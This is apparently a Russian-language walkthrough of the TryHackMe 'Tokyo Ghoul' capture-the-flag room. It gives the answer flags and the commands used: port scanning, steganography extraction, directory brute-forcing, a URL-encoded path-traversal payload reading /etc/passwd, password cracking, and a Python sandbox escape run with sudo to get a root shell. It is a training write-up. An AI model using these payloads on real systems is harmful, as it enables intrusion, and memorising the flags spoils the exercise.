[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Tokyo Ghoul](https://tryhackme.com/r/room/tokyoghoul666) 

Всего 6 заданий:
## Задание 1
взеби дялмн????

Эта комната во многом вдохновлена  «Psychobreak»  и основана на аниме «Tokyo Ghoul».

Внимание: в этой комнате могут быть спойлеры «только к 1 и 2 сезонам», поэтому, если вам интересно посмотреть аниме, 
подождите, пока не закончите смотреть аниме, а затем возвращайтесь, чтобы заняться комнатой.

Машине потребуется некоторое время, просто возьмите воды или приготовьте кофе.



Эта комната содержит некоторые элементы, не относящиеся к pg13, в форме повествовательных описаний. Пожалуйста, 
продолжайте только на своем собственном уровне комфорта.

### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```
Разверните машину 
```commandline
Ответ не нужен
```

## Задание 2
Давайте проведем сканирование.

### Ответьте на вопросы ниже
Используйте nmap для сканирования всех портов 
```commandline
nmap -sSCV <IP>
```
```commandline
Ответ не нужен
```
Сколько портов открыто? 
```commandline
3
```
Какая операционная система используется?
```commandline
ubuntu
```

## Задание 3
Попробуйте осмотреться вокруг, может быть, что-то окажется полезным. 

### Ответьте на вопросы ниже
Ты нашел записку, которую тебе дали другие гули? Где ты ее нашел? 
```commandline
jasonroom.html
```
Какой ключ у исполняемого файла Rize?
```commandline
ftp <IP>
ls
cd need_Help?
ls
get Aogiri_tree.txt
cd Talk_with_me
ls
get need_to_talk
get rize_and_kaneki.jpg

cat Aogiri_tree.txt
chmod 777 need_to_talk  
./need_to_talk
strings need_to_talk
```
```commandline
kamishiro
```
Используйте инструмент, чтобы получить другую записку от Ризе.
```commandline
Ответ не нужен
```

## Задание 4
Ты должен мне помочь, я не могу терпеть боль, аа ...
### Ответьте на вопросы ниже
Что означает это сообщение? Вы его поняли? Что в нем говорится?
```commandline
./need_to_talk
# kamishiro
steghide extract -sf rize_and_kaneki.jpg 
# You_found_1t   
cat yougotme.txt
# Morse Code
# asciitohex
#  Base64
```
```commandline
d1r3c70ry_center
```
Видишь ли ты слабость в темноте? Нет? Просто ищи. 
```commandline
dirb http://<IP>/d1r3c70ry_center/
http://<IP>/d1r3c70ry_center/claim/
```
```commandline
Ответ не нужен
```
Что ты нашел? Взломай это
```commandline
Ответ не нужен
```
что такое имя пользователя rize?
```commandline
http://<IP>/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```
```commandline
kamishiro
```
какой пароль у rize?
```commandline
vim hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
```commandline
password123
```

## Задание 5
Наконец-то я получил Ризе Кагуне, который помог мне сразиться с Джейсоном и получить root.

### Ответьте на вопросы ниже
пользователь.txt
```commandline
ssh kamishiro@<IP>
ls
cat user.txt
```
```commandline
e6215e25c0783eb4279693d9f073594a
```
корень.txt
```commandline
sudo -l
cat jail.py
sudo /usr/bin/python3 /home/kamishiro/jail.py
__builtins__.__dict__['__im' + 'port__']('pty').spawn("/bin/bash")
id
cat /root/root.txt
```
```commandline
9d790bb87898ca66f724ab05a9e6000b
```
## Задание 6
Вы можете связаться со мной в Discord: 0UR4N05#6231

Поздравляю, вы завершили комнату 1 Токийского гуля. Это первая комната, которую я когда-либо создавал, так что если она вам понравилась, пожалуйста, дайте мне знать в  Twitter  и отправьте мне свой отзыв в Twitter или Discord, и я буду очень признателен, если вам понравится эта комната и вы поделитесь ею со своими друзьями, спасибо.
### Ответьте на вопросы ниже
Спасибо
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)